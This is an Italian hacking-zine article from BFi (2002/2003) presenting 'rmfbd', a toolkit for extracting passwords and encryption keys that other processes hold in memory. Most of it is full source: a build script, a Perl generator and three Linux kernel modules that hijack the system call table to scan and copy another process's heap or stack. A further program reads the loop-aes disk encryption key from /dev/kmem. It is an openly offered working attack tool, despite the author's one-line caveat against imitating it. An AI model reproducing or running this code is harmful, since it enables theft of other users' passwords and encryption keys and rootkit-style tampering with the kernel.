@@ -1,0 +1,1335 @@
+==============================================================================
+-------------[ BFi numero 11, anno 6 - 23/12/2003 - file 6 di 15 ]------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ RAPE MEM0RY F0R BETTER DiNNER
+---[ dev-06, 16/03/2002
+-----[ vecna <vecna@s0ftpj.org>
+
+
+
+                        RAPE MEMORY FOR BETTER DINNER
+                   stupra la memoria per una cena migliore
+
+
+dedicato a chi ha scritto un articolo per bfi, senza sapere che sarebbe stato
+l'ultimo.
+
+sono ormai 4 mesi che questo progetto e` pronto, probabilmente l'idea l'ho
+dalla prima volta che ho usato PGP nella mia vita, molto + probabilmente prima
+ancora che accendessi un pc c'era gia` chi lo sapeva, l'unica cosa veramente
+nuova che troverete qui dentro e` il codice.
+
+
+-] IL CONCETTO ---------------------------------------------------------------
+
+a tutti capita di mettere una password :)
+non tutte sono pero` password d'accesso (/bin/login, /usr/sbin/sshd ...):
+queste password hanno una vita decisamente breve all'interno del sistema,
+vengono lette, vengono crittate, vengono confrontate con la password crittata
+che viene tenuta su un file necessario a regolar gli accessi, vengon tolte
+dalla memoria.
+ci sono password che pero` rimangono in memoria, per errore o per necessita`,
+e sarebbe interessante riuscire a leggerle *dopo* che siano state inserite
+dall'utente. (se ci si intromette nella macchina prima si puo` mettere qualche
+affare come piove.c [threads di BFi9] che salva quello che viene scritto senza
+echo di terminale) il bello sarebbe arrivare su una macchina, poter leggere
+la password da quel processo e potersene andare. questo e` uno degli obiettivi
+che avevo per rmfbd e almeno questo l'ho raggiunto.
+
+
+-] DIETRO LE QUINTE ----------------------------------------------------------
+
+supponiamo di avviar un programma stupido come:
+
+<-| rmfbd/keyreader.c |->
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main(void)
+	{
+	char *x, *p;
+	int fd;
+	char foo[32]="\0";
+
+	x =(char *)malloc(1234);
+	/* previous various allocation */
+
+	p =getpass(" Insert key:");
+
+	printf("password [%s] at %x pid %d\n", p, p, getpid());
+
+	/* just for stop program on loop how cfs/tcfs/other */
+
+	while(write(STDIN_FILENO, foo, sizeof(foo)) != -1)
+		sleep(1);
+
+	return 0;
+	}
+<-X->
+
+503./root# ./keyreader
+ Insert key:
+password [topsecret] at 8049e50 pid 458
+
+se da un'altra shell avviamo lo stesso programma, mentre il keyreader al pid
+458 sta ancora girando, vedremo che l'indirizzo che ci viene restituito e`
+sempre lo stesso, 0x08949e50.
+
+ma la memoria non era solo una? e un indirizzo non corrisponde ad una
+parte in modo univoco? si`... si` e no... il kernel, per gestire tutti
+i processi che girano, fa si` che ognuno abbia a disposizione una certa
+quantita` di memoria e gli indirizzi di partenza (dello stack e dell'heap)
+che vengono assegnati ad ogni processo sono sempre gli stessi! il kernel per
+poter risalire all'indirizzo reale, si basa sull'indirizzo virtuale+il pid
+del processo. questi indirizzi sono relativi ad ogni processo e sono linkati
+ad ogni struttura task_struct nel kernel nel puntatore a struttura *mm.
+in linux/sched.h si vede tutto, il funzionamento in se` come gestione della
+memoria virtuale non lo conosco.
+
+cmq cosa significa? che se ho 2 programmi che fan la stessa cosa, se metto
+dei dati dentro a un processo e so a che indirizzo stanno, se applico 
+l'indirizzo trovato all'altro processo leggero` quei dati (che pero` saran
+diversi dal mio).
+
+in soldoni, se in un sistema trovo un keyreader che gira e voglio sapere
+che password han messo dentro, mi bastera` avviare un mio keyreader,
+mettere una password che conosco, scannare la memoria virtuale del mio
+keyreader in modo da trovare la password che conosco, veder a che indirizzo
+e`, applicare quell'indirizzo all'altro processo e cosi` facendo leggere la
+password che c'e`.
+
+
+-] CONCETTI DI FUNZIONAMENTO E (enormi :) PROBLEMI DI IMPLEMENTAZIONE --------
+
+se in termini teorici e` facile capire quello che c'e` scritto alla fine del
+paragrafo precedente, in termini pratici non e` cosi` immediato implementarlo.
+o almeno lo diventa dopo la seconda volta che si riscrive il codice, esperienza
+che non auguro a nessuno.
+
+i punti critici da raggiungere sono:
+
+A) sapere a che indirizzo sta` la mia password
+
+	la cosa puo` sembrare semplice con un esempio stupido come keyreader.c,
+	in quel caso e` bastata una printf di un puntatore ... ma bisogna 
+	considerare la miriade di programmi che non rendono disponibile
+	il proprio codice.
+
+	per poter andar a colpo sicuro, basta "scannare" la memoria, ovvero,
+	dopo aver indicato se si tratta di stack o heap, ovvero se la password
+	viene messa in un buffer tipo char *buf =alloc(BUFLEN); o
+	char buf[BUFLEN] (questi 2 sono nello stack) o se sta` in
+	static char buf[BUFLEN] o char *buf =malloc(BUFLEN) 
+	(malloc, realloc, calloc, tutte e 3 lavorano sull'heap)...
+	basta poter accedere al segmento di memoria virtuale di questo 
+	processo. in questo modo sara` possibile fare una comparazione di 
+	memoria (man memcmp(3)) della dimensione della nostra password, 
+	finche` non matchera`. una volta trovato, abbiamo in mano l'indirizzo 
+	del buffer dove sta` la password. visto che il codice che gira
+	sul nostro processo e` lo stesso e visto che abbiamo potuto scannare
+	la memoria di un nostro processo, nulla ci impedisce di leggere un
+	po' di byte dell'altro processo nello stesso punto in cui abbiamo
+	trovato la password nel nostro (tanto gli indirizzi sono gli stessi :)
+
+	il problema e` che gli indirizzi si`, sono gli stessi a parita` di
+	condizioni ... ma le condizioni sono un po' restrittive ... c'e`
+	da dire che lo spazio che in memoria occupera` un programma non 
+	cambia (se devo caricar 20 byte nello stack xke` ho 5 int, saran
+	sempre 20 byte, se poi avro` il buffer da 128 byte della password
+	dall'indirizzo relativo 20 al 20+128 potro` avere la password, questo
+	senza ombra di dubbio :) senza ombra di dubbio anche la grandezza
+	delle istruzioni che vengono caricate ed analizzate poco a poco
+	dal microprocessore, sono sempre le stesse. quello che influenza 
+	e`: *l'indirizzo di partenza dei segmenti virtuali* e *quello che
+	c'e` nel codice che gira prima di noi*
+
+	l'indirizzo di partenza dipende dalla versione del kernel,
+	dall'architettura, dalla versione di gcc. sono pochi byte
+	che ci sono dal primo segmento di memoria utilizzabile al primo
+	byte allocabile nello stack o nell'heap. risultano gia` occupati
+	da qualcosa che non ho capito cos'e`. (secondo la mia umile opinione
+	senza fondamenti di sorta, si tratta delle chiamate a mmap(2) che 
+	vengono inserite in fase di linking dal gcc, o cmq qualcosa che non 
+	vediamo, ma c'e` e viene eseguito/allocato)
+
+	se non fosse per quella dinamicita`, si potrebbe calcolare l'indirzzo
+	del buffer con i dati che ci interessano sulla propria macchina per
+	pasticciare meno in kernel space con moduli di controllo, di calcolo,
+	di test.
+
+B) riuscir a leggere la parte di memoria di un altro processo 
+
+	e questa e` una cosa un po' dura ... ogni processo teoricamente
+	ha un punto da cui puo` partire l'allocazione della memoria, quello
+	che viene memorizzato nella struttura task_struct cmq non e` 
+	l'indirizzo reale della memoria, ma solo un valore, che equivale
+	all'indirizzo virtuale. ogni volta che si cerca di accedere ad
+	un puntatore ad una certa posizione il kernel trovera` il
+	rispettivo equivalmente nella memoria fisica. noi possiamo accedere
+	ad un certo indirizzo di un certo programma solamente quando il 
+	kernel sta lavorando su quel processo. visto il funzionamento del
+	kernel sappiamo che ogni processo e` descritto da una struttura
+	chiamata task_struct, e che ogni volta che il kernel inizia 
+	a lavorare su un altro pid (ovvero cambia la task_struct sulla quale
+	sta` lavorando) cambia anche il puntatore "current" che punta alla
+	task_struct che in questo momento sta lavorando.
+
+	visto che noi dobbiamo accedere ad un indirizzo tipo 0x0defaced
+	ma questo indirizzo puo` esserci in ogni processo, dobbiamo
+	cercar di lavorare sulla memoria (se stiamo scannando o leggendo)
+	di un processo solo finche` il kernel continua a lavorare su
+	quel processo, se noi ciclicamente iniziamo a leggere la memoria
+	da 0x0defaced a 0x0defeeee, ma il pid cambia quando siamo a 
+	0x0defac10 e ci troviamo su un altro programma che NON e` detto 
+	abbia allocato un segmento che comprende quell'indirizzo di memoria 
+	(ricevendo un bel kernel page fault) quindi e` vitale controllare
+	il pid tramite current->pid prima di ogni controllo di memoria,
+	e nel caso siamo ancora su quello che stiamo analizzando, leggere
+	all'offset a cui siamo arrivati (poi l'offset a poco a poco aumenta
+	finche` non trova la password o raggiunge il limite che gli
+	abbiamo impostato)
+
+spiegati i 2 punti mistici del concetto di funzionamento, vediamo in passi
+come funziona rmfbd.
+
+	1) viene compilato un codice che alloca dei byte (i test possono esser
+	   fatti su heap con malloc() o buffer statici oppure su stack ...)
+	2) viene compilato un modulo per il kernel che legge la distanza tra
+	   l'inizio del segmento di memoria virtuale (raggiungibile da
+	   struct task_struct -> mm -> start_brk per l'heap e da start_stack
+	   per lo stack) e l'indirizzo del primo buffer, che non coincide xke` 
+	   c'e` allocata altra roba che dipende anche dal kernel ad esempio,
+	   di una grandezza non fissa, motivo per cui andiamo a prenderla
+	   dalla struct mm.
+	3) viene compilato un modulo che, conoscendo il pid del programma di 
+	   prova, la password che deve trovare, l'offset del primo indirizzo
+	   allocabile, si prenda la briga di scannare la memoria per trovare
+	   l'indirizzo in cui in quel programma specifico sta la key.
+	4) si applica quell'indirizzo con il terzo modulo che compiliamo ora 
+	   in modo da prendere la famigerata password.
+
+
+      --      questo software e` un esempio di abuso del kernel     --
+      --          e come tale non dovrebbe essere imitato.          --
+
+
+-] FUNZIONAMENTO DEL SISTEMA DI MODULI DINAMICI PRESENTATI IN rmfbd ---------
+
+purtroppo x me... mi sono accorto di poter lavorare sulla task_struct *current
+solo attraverso le system call.
+le system call possono essere chiamate da ogni processo e a noi interessa
+invece lavorare su un preciso processo. potenzialmente van bene tutte le
+system call che vengono chiamate dopo che la password e` stata memorizzata.
+visto che i moduli per il kernel sono abbastanza semplici e riproducibili
+(finche` si parla di wrapper a system call non si puo` negare che tra
+init_module, cleanup_module e wrapper della chiamata alla fine sono tutti la
+stessa roba...) ho previsto un template che contiene le macro di quasi tutte
+le system call in linux, i 3 moduli che verran caricati (rmfbd_step1 _step2 e
+step3.c) han 3 include di 3 file .c che verrano generati da modgen.pl e dal
+template in modo che i moduli che ho fatto potenzialmente wrapperino tutte
+le systemcall, la parte di codice che cambia viene fatta al momento da
+modgen.pl .
+
+
+-] PRESENZA DI CHIAVI IN KERNEL MEMORY --------------------------------------
+
+e` possibile che alcuni sw (loop-aes ad esempio), tramite un client
+particolare (losetup) via device driver + ioctl, passino la chiavi in kernel
+space perche` e` li` che serve. non e` difficile beccare la password in questo
+caso, risulta anzi essere piu` semplice che nell'altro caso perche` gli
+indirizzi della kernel memory non sono dinamici ne` virtuali come quelli in
+userspace, pero` e` impossibile fare un codice che automaticamente individui
+quella password. la sequenza di passi necessaria e`:
+
+	1) legger il codice e veder il nome della struttura o buffer statico
+	   nel modulo o nella patch;
+	2) - nel caso si tratti di una patch statica nel kernel con un grep
+	     si trova l'indirizzo del simbolo in System.map
+	   - nel caso si tratti di un modulo basta cercare in /proc/ksyms i
+	     simboli che appaiono di quel modulo, cercare i simboli in comune
+	     tra l'output di "nm module.o", cercare l'indirizzo relativo che
+	     si trova nell'output di nm e sommarlo all'indirizzo assoluto che
+	     abbiam visto in ksyms piu` vicino al nostro buffer;
+	3) ritoccare rmfbd_kmem in modo che legga la struttura di turno e la
+	   cerchi in memoria, in build.sh si vede l'esempio di come si trova
+	   la struttura loop_dev che contiene anche la chiave che cerchiamo.
+
+
+-] CODICI -------------------------------------------------------------------
+
+-rwxr-xr-x    1 vecna    users        3416 Feb  2 18:00 build.sh
+-rw-r--r--    1 vecna    users         430 Dec 17 13:26 keyreader.c
+-rw-r--r--    1 vecna    users         687 Dec 17 13:25 minimal_check.c
+-rwxr-xr-x    1 vecna    users         855 Oct 18 00:46 modgen.pl
+-rw-r--r--    1 vecna    users         754 Dec 16 22:01 rmfbd_kmem.c
+-rw-r--r--    1 vecna    users        1161 Dec 17 13:23 rmfbd_step1.c
+-rw-r--r--    1 vecna    users        2054 Dec 17 13:23 rmfbd_step2.c
+-rw-r--r--    1 vecna    users        1337 Dec 17 13:23 rmfbd_step3.c
+-rw-r--r--    1 vecna    users        4779 Nov 26 13:22 template.syscall
+
+build.sh 	= 	shell script che fa da Makefile
+keyreader.c 	= 	programma C che analogamente a CFS, TCFS ed altri 
+			software funziona tenendo la propria password in 
+			memoria aspettando che qualcuno gliela legga
+minimal_check.c	=	programma in C che alloca 1 byte in modo da trovare 
+			l'indirizzo del primo byte allocato da un processo e 
+			basarsi su questo primo offset per iniziare la
+			scansione della memoria (sto pensando che e` inutile,
+			ma inizialmente l'avevo previsto perche` non mi fidavo
+			a inizare a scannare la memoria in una parte che non so
+			come funziona, per evitare problemi ho fatto questo
+			sistema che praticamente fa perdere circa 10 secondi
+			in piu` alla vostra vita)
+modgen.pl	=	programma che genera i 3 file che vengono inclusi
+			tutti e 3 nei 3 moduli
+rmfbd_kmem.c	=	esempio stupido di come si prende la password a
+			loop-aes
+rmfbd_step1.c	=	primo step, quello x cui si vede l'offset tra il
+			primo byte allocato e l'inizio del segmento,
+			quella roba di cui parlo anche dopo minimal_check.c =
+rmfbd_step2.c	=	una volta saputa la password che abbiamo messo noi
+			nel nostro processo di test e una volta saputo 
+			l'offset da cui iniziare a scannare, a poco a poco
+			tutta la memoria nel nostro processo viene analizzata
+			finche` non si trova la nostra password, in modo da 
+			trovare l'indirizzo del suo buffer.
+rmfbd_step3.c	=	una volta trovato l'indirizzo del buffer si applica
+			al pid del programma da sviscerare e si copiano i
+			primi TOT byte.
+
+template.syscall non so come spiegarlo se non mostrando una sua parte:
+
+3 SYS_lchown (const char *a, uid_t b, gid_t c)
+2 SYS_setresuid (uid_t a, uid_t b)
+3 SYS_fcntl (unsigned int a, unsigned int b, unsigned long c)
+
+<-| rmfbd/build.sh |->
+#!/bin/bash
+
+function kmem()
+	{
+	echo "kmem is only example for hack loop-aes, not other code!"
+
+	gcc rmfbd_kmem.c -O2 -Wall -o rmfbd_kmem
+
+	if [ ! -r /boot/System.map ]; then
+		echo "I don't find /boot/System.map, where is it ?"
+		read SYSMAP
+	fi
+	SYSMAP=/boot/System.map
+
+	GRZNUM=`grep loop_dev $SYSMAP | awk {'print $1'}`
+	if [ ! $GRZNUM ]; then
+		echo "unable to find symbol \"loop_dev\" on $SYSMAP"
+		exit 0
+	fi
+	./rmfbd_kmem `printf "%u" 0x$GRZNUM`
+
+	exit 0
+	}
+
+function check_error()
+	{
+	if [ -s $1 ]; then
+		echo "error con compilation"
+		cat $1
+		exit 0
+	fi
+	return
+	}
+
+function clean()
+	{
+	echo "x): clean temp file and possible old object"
+	rm -f minimal rmfbd_kmem aoa.TMPVAR *.o mkF* mkL* *df*
+	return
+	}
+
+clean
+
+if [ $1 ]; then
+	if [ $1 = "clean" ]; then
+		echo "cleaned..."
+		exit 0
+	fi
+fi
+
+echo "tell me what kind of memory do you needed to hack, stack/heap/kernel"
+read KIND
+
+if [ $KIND == "kernel" ]; then
+	kmem
+fi
+
+if [ $KIND == "stack" ]; then
+	DEF="-DSTACK"
+elif [ $KIND == "heap" ]; then
+	DEF="-DHEAP"
+fi
+
+gcc minimal_check.c -o minimal $DEF 2>mkF1
+check_error mkF1
+
+echo "1): compiling and start program for memory test"
+./minimal &
+PID=`ps | grep minimal | awk {'print $1'}`
+./modgen.pl read
+
+echo "2): building module for take first offset"
+
+gcc -c -O6 -fomit-frame-pointer rmfbd_step1.c \
+	-I/usr/src/linux/include $DEF 2>>mkF2
+
+if [ -s mkF2 ]; then
+	echo "error appears on compiling first module..."
+	cat mkF2
+fi
+
+if [ ! -r /var/log/kern.log ]; then
+	echo "I don't find /var/log/kern.log as kernel logfile, what's is your?"
+	read KLOGF
+else
+	KLOGF=/var/log/kern.log
+fi
+
+insmod rmfbd_step1.o pid=$PID aoa=`cat aoa.TMPVAR` 2>>mkL1
+if [ -s mkL1 ]; then
+	echo "error appears on loading first module... are you root ?"
+	cat mkL1
+	exit 0
+fi
+
+sleep 1
+OFFSET=`tail $KLOGF | grep SIGTL1 | awk {'print $8'} | uniq`
+
+echo "    offset retrivered is $OFFSET"
+
+echo "    remove module for get memory offset"
+rmmod rmfbd_step1
+echo "    killing ./minimal background process"
+killall -KILL minimal
+
+echo "3): work with module for memory scanning"
+
+./modgen.pl 2>>mkF3
+if [ -s mkF3 ]; then
+	echo "error on build syscall-dependent code"
+	cat mkF3
+	exit 0
+fi
+
+gcc -c -O6 -fomit-frame-pointer rmfbd_step2.c \
+	-I/usr/src/linux/include $DEF 2>>mkF3
+
+if [ -s mkF3 ]; then
+	echo "error on compiling module for memory scanning"
+	cat mkF3
+	exit 0
+fi
+
+echo "_insert key to search on test program"
+read KEY
+echo "please switch tty and start test program ... press any key after"
+read
+ps axf | more
+echo "what's pid of test program ?"
+read PID
+echo "done ... loading of module for memory scanning... $KEY $OFFSET $PID"
+insmod rmfbd_step2.o key=$KEY limit=15000 offset=$OFFSET pid=$PID 2>>mkL2
+if [ -s mkL2 ]; then
+	echo "error on loading rmfbd_step2.o!!"
+	cat mkL2
+	exit 0
+fi
+
+echo "    scanning 2 seconds for search key"
+sleep 2;
+KEYOFF=`tail $KLOGF | grep SIGTL2 | awk {'print $8'} | uniq`
+rmmod rmfbd_step2
+
+if [ ! $KEYOFF ]; then
+	echo "holy shit! unable to find key $KEY on pid $PID"
+	exit 0
+fi
+
+echo "4) compiling final module for seek at $KEYOFF"
+
+echo "_insert pid of target program"
+read TARGETPID
+
+gcc -c -O6 -fomit-frame-pointer rmfbd_step3.c -I/usr/src/linux/include $DEF
+insmod rmfbd_step3.o keyoff=$KEYOFF pid=$TARGETPID
+echo "    waiting 2 seconds for find secret key"
+sleep 2
+tail $KLOGF | grep SIGTL3 > ./secret_report
+echo "#) end, on ./secret_report you may find the key"
+rmmod rmfbd_step3
+exit 0
+<-X->
+
+<-| rmfbd/minimal_check.c |->
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define SIZECHECK 	128
+
+#ifndef HEAP
+#ifndef STACK
+#error "use ./build.sh"
+#endif
+#endif
+
+int main(void)
+	{
+#ifdef HEAP
+	/* allocation of standard getpass() allocation */
+	static char bss_buf[SIZECHECK];
+	void *p =(void *)&bss_buf;
+	/* the some thing for mallocated buffer */
+#endif
+#ifdef STACK
+	/* allocation for check whenever after getpass appears copy in stack */
+	char stack_buf[SIZECHECK];
+	void *p =(void *)&stack_buf;
+#endif
+	FILE *out =fopen("aoa.TMPVAR", "w+");
+
+	if(out ==NULL)
+		return EXIT_FAILURE;
+
+	fprintf(out, "%u\n", p);
+	fclose(out);
+
+	while(1)
+		read(STDIN_FILENO, p, SIZECHECK);
+
+	return EXIT_SUCCESS;
+	}
+<-X->
+
+GRAZIE iauna per avermi fatto modgen.pl, http://yawna.free.fr usate yairc.
+
+<-| rmfbd/modgen.pl |->
+#!/usr/bin/perl -w
+
+open(TP,"<template.syscall");
+open(F1,">funct_df.c");
+open(F2,">sysch_df.c");
+open(F3,">sysrt_df.c");
+
+if(!$ARGV[0]) {
+  print "insert system call to monitor: ";
+  $syscall = <>;
+  chop($syscall);
+} else {
+  $syscall =$ARGV[0];
+}
+
+while(<TP>) {
+   my($f,$p)= /\d SYS_(\w+) \(([\w*& ,]*)\)/;
+   if($f eq $syscall) {
+      my @s = split/,/,$p;
+      my $s = join",", map{ /(\w+)$/ }@s;
+      print F1 "int (*linux_$f)($p);\n\n";
+      print F1 "static int my_$f($p)\n\t{";
+      print F1 "\n\tmemory_hack();\n\n\treturn linux_$f($s);\n\t}\n";
+
+      print F2 "\t{\n\textern int my_$f($p);\n\n";
+      print F2 "\tlinux_$f =sys_call_table[SYS_$f];\n";
+      print F2 "\tsys_call_table[SYS_$f] =my_$f;\n\t}\n";
+
+      print F3 "\textern int (*linux_$f)($p);\n\n";
+      print F3 "\tsys_call_table[SYS_$f] =linux_$f;\n";
+      last;
+   }
+}
+<-X->
+
+<-| rmfbd/rmfbd_kmem.c |->
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define LO_NAME_SIZE	64
+#define LO_KEY_SIZE	32
+
+struct loop_device 
+	{
+	int lo_number;
+	void *inode;
+	int lo_refcnt;
+	unsigned short lo_device;
+	int lo_offset;
+	int lo_encrypt_type;
+	int lo_encrypt_key_size;
+	int lo_flags;
+	void *func;
+	char lo_name[LO_NAME_SIZE];
+	char lo_encrypt_key[LO_KEY_SIZE];
+	/* ... other varous field */
+	};
+
+int main(int argc, char **argv)
+	{
+	FILE *kmem;
+	unsigned int offset;
+	struct loop_device rd;
+
+	if(argc != 2)
+		{
+		printf("%s address\n", argv[0]);
+		return 1;
+		}
+
+	offset =atoi(argv[1]);
+
+	kmem =fopen("/dev/kmem", "r");
+
+	fseek(kmem, offset, SEEK_SET);
+	fread((void *)&rd, sizeof(rd), 1, kmem);
+
+	printf("la key e` \"%s\"\n", rd.lo_encrypt_key);
+
+	fclose(kmem);
+	return 0;
+	}
+<-X->
+
+<-| rmfbd/rmfbd_step1.c |->
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/version.h>
+#include <linux/types.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/module.h>
+#include <linux/errno.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+
+extern void *sys_call_table[];
+
+/* pid of test program */
+MODULE_PARM(pid, "i");
+static int pid;
+
+/* address of allocation (address of allocation) */
+MODULE_PARM(aoa, "i");
+static unsigned int aoa;
+
+#ifndef HEAP
+#ifndef STACK
+#error "use ./build.sh"
+#endif
+#endif
+
+/* this code is for first step only */
+static void memory_hack(void)
+	{
+	static unsigned int offset;
+
+	if(current->pid ==pid)
+		{
+		offset= aoa -
+#ifdef HEAP
+		(unsigned int)current->mm->start_brk;
+#endif
+#ifdef STACK
+		(unsigned int)current->mm->start_stack;
+#endif
+		}
+
+	if(offset)
+		printk(KERN_DEBUG "SIGTL1: offset %u\n", offset);
+	}
+
+#include "funct_df.c"
+
+int init_module(void)
+	{
+
+	if(!pid || !aoa)
+		{
+		printk(KERN_ERR "invalid argument, use Makefile\n");
+		printk(KERN_DEBUG "pid %d aoa %u\n", pid, aoa);
+		return EINVAL;
+		}
+
+#include "sysch_df.c"
+
+	return(0);
+	}
+
+void cleanup_module(void)
+	{
+
+#include "sysrt_df.c"
+
+	}
+<-X->
+
+<-| rmfbd/rmfbd_step2.c |->
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/version.h>
+#include <linux/types.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/module.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+
+extern void *sys_call_table[];
+
+/* pid of copy of program to analyze */
+MODULE_PARM(pid, "i");
+
+/* offset retrivered with rmfbd_step1.o module */
+MODULE_PARM(offset, "i");
+
+/* limit on memory for search example-key */
+MODULE_PARM(limit, "i");
+static int pid, offset, limit;
+
+#ifndef HEAP
+#ifndef STACK
+#error "use ./build.sh"
+#endif
+#endif
+
+/* 
+ * example key, needed for find it on example program and replicate the some
+ * offset after has been discovered here
+ */
+MODULE_PARM(key, "s");
+static char *key;
+
+static void memory_hack()
+	{
+	if(current->pid ==pid)
+		{
+		void *check_addr, *end;
+		register size_t keylen =strlen(key);
+		char check[keylen +1];
+		unsigned long start_mem_addr;
+
+		printk(KERN_INFO "keylen e` %d\n", keylen);
+		
+#ifdef HEAP
+		start_mem_addr =current->mm->start_brk;
+#endif
+#ifdef STACK
+		start_mem_addr =current->mm->start_stack;
+#endif
+
+		check_addr =(void *)(start_mem_addr +offset);
+		end =(void *)((unsigned int)check_addr +limit);
+
+		while(current->pid == pid && check_addr != end)
+			{
+			__generic_copy_from_user(&check, check_addr, keylen);
+
+			if(!memcmp(&check, key, keylen))
+				{
+				printk(KERN_INFO "SIGTL2: keyoff %u\n", 
+				(unsigned int)check_addr - start_mem_addr);
+				break;
+				}
+#ifdef DEBUG
+			else
+				printk(KERN_INFO "no find at %x\n", check_addr);
+#endif
+
+			(char *)check_addr++;
+			}
+
+		if(current->pid == pid && check_addr ==end)
+			printk(KERN_INFO "no key find before %u test\n", limit);
+
+		}
+	}
+
+#include "funct_df.c"
+
+int init_module(void)
+	{
+
+	if(!pid || !limit || !offset || key ==NULL)
+		{
+		printk(KERN_INFO "required: key, offset, limit, pid\n");
+		printk(KERN_DEBUG "key %s off %u limit %u pid %d\n",
+					key, offset, limit, pid);
+		return EINVAL;
+		}
+
+#include "sysch_df.c"
+
+	return(0);
+	}
+
+void cleanup_module(void)
+	{
+
+#include "sysrt_df.c"
+
+	}
+<-X->
+
+<-| rmfbd/rmfbd_step3.c |->
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/version.h>
+#include <linux/types.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/module.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+
+extern void *sys_call_table[];
+
+/* offset of key for attacked program, retrivered by rmfbd_step2.o */
+MODULE_PARM(keyoff, "i");
+
+/* pid of attacked program */
+MODULE_PARM(pid, "i");
+static int pid, keyoff;
+
+#define BUFLEN 16
+
+#ifndef HEAP
+#ifndef STACK
+#error "use ./build.sh"
+#endif
+#endif
+
+static void memory_hack()
+	{
+	if(current->pid ==pid)
+		{
+		char keybuf[BUFLEN];
+#ifdef HEAP
+	 	void *key=(void *)(current->mm->start_brk +keyoff);
+#endif
+#ifdef STACK
+	 	void *key=(void *)(current->mm->start_stack +keyoff);
+#endif
+		register char i;
+
+		__generic_copy_from_user(&keybuf, key, BUFLEN);
+
+		printk(KERN_INFO "first %d byte on %d pid memory offset %u:\n",
+			BUFLEN, pid, keyoff);
+
+		printk(KERN_INFO "SIGTL3: ");
+		for(i =0; i < BUFLEN; i++)
+			printk("[%c]", keybuf[i]);
+
+		printk("\n");
+		}
+	}
+
+#include "funct_df.c"
+
+int init_module(void)
+	{
+
+	if(!pid || !keyoff)
+		{
+		printk(KERN_INFO "required: pid and keyoff\n");
+		printk(KERN_DEBUG "keyoff %u pid %d\n", keyoff, pid);
+		return EINVAL;
+		}
+
+#include "sysch_df.c"
+
+	return(0);
+	}
+
+void cleanup_module(void)
+	{
+
+#include "sysrt_df.c"
+
+	}
+<-X->
+
+<-| rmfbd/template.syscall |->
+3 SYS_write (unsigned int a, const char *b, size_t c) 
+2 SYS_setrlimit (unsigned int a, struct rlimit *b)
+3 SYS_getdents (unsigned int a, void *b, unsigned int c)
+2 SYS_umount (char *a, int b)
+2 SYS_munlock (unsigned long a, size_t b)
+1 SYS_delete_module (const char *a)
+2 SYS_fstat (unsigned int a, struct __old_kernel_stat *b)
+1 SYS_getpgid (pid_t a)
+4 SYS_rt_sigaction (int a, struct sigaction *b, struct sigaction *c, size_t d)
+1 SYS_setfsgid (gid_t a)
+1 SYS_chroot (const char *a)
+1 SYS_times (struct tms *a)
+5 SYS_query_module (const char *a, int b, char *c, size_t d, size_t *e)
+3 SYS_writev (unsigned long a, const struct iovec *b, unsigned long c)
+2 SYS_rename (const char *, const char *)
+2 SYS_truncate (const char *a, unsigned long b)
+3 SYS_waitpid (pid_t a, unsigned int *b, int c)
+1 SYS_fsync (unsigned int a)
+2 SYS_lstat (char *a, struct __old_kernel_stat *b)
+2 SYS_dup2 (unsigned int a, unsigned int b)
+1 SYS_close (unsigned int a)
+1 SYS_setgid (gid_t a)
+2 SYS_statfs (const char *a, struct statfs *b)
+5 SYS_mount (char *a, char *b, char *c, unsigned long d, void *e)
+4 SYS_wait4 (pid_t a, unsigned int *b, int c, struct rusage *d)
+0 SYS_fork ()
+1 SYS_setfsuid (uid_t a)
+2 SYS_settimeofday (struct timeval *a, struct timezone *b)
+4 SYS_pwrite (unsigned int a, const char *b, size_t c, loff_t d)
+1 SYS_ssetmask (int)
+1 SYS_exit (int)
+1 SYS_sysinfo (struct sysinfo *a)
+2 SYS_symlink (const char *a, const char *b)
+3 SYS_ioctl (unsigned int a, unsigned int b, unsigned long c)
+2 SYS_creat (const char *a, int b)
+3 SYS_lchown (const char *a, uid_t b, gid_t c)
+2 SYS_setresuid (uid_t a, uid_t b)
+3 SYS_fcntl (unsigned int a, unsigned int b, unsigned long c)
+0 SYS_setsid ()
+3 SYS_mprotect (unsigned long a, size_t b, unsigned long c)
+1 SYS_setuid (uid_t a)
+1 SYS_umask (int a)
+2 SYS_kill (int a, int b)
+2 SYS_nanosleep (struct timespec *a, struct timespec *b)
+1 SYS_stime (int *a)
+2 SYS_signal (int a, __sighandler_t b)
+2 SYS_getitimer (int a, struct itimerval *b)
+3 SYS_readv (unsigned long a, const struct iovec *b, unsigned long c)
+2 SYS_getcwd (char *a, unsigned long b)
+3 SYS_msync (unsigned long a, size_t b, int c)
+2 SYS_link (const char *, const char *)
+0 SYS_getgid ()
+5 SYS__newselect (int a, fd_set *b, fd_set *c, fd_set *d, struct timeval *e)
+2 SYS_getrusage (int a, struct rusage *b)
+3 SYS__llseek (unsigned int a, off_t b, unsigned int c)
+1 SYS_nice (int)
+2 SYS_setgroups (int a, gid_t *b)
+2 SYS_munmap (unsigned long a, size_t b)
+2 SYS_getrlimit (unsigned int a, struct rlimit *b)
+1 SYS_brk (unsigned long a)
+1 SYS_personality (unsigned long)
+1 SYS_getpid ()
+3 SYS_ioperm (unsigned long a, unsigned long b, int c)
+4 SYS_ptrace (long a, long b, long c, long d)
+1 SYS_dup (unsigned int a)
+1 SYS_getsid (pid_t a)
+0 SYS_getegid ()
+1 SYS_uselib (const char *a)
+0 SYS_getuid ()
+2 SYS_init_module (const char *a, struct module *b)
+2 SYS_capget (cap_user_header_t a, cap_user_data_t b)
+3 SYS_getresgid (gid_t *a, gid_t *b, gid_t *c)
+3 SYS_read (unsigned int a, void *b, size_t c)
+3 SYS_open (const char *a, int b, int c)
+2 SYS_setdomainname (char *a, int b)
+2 SYS_setregid (gid_t a, gid_t b)
+1 SYS_alarm (insigned int a)
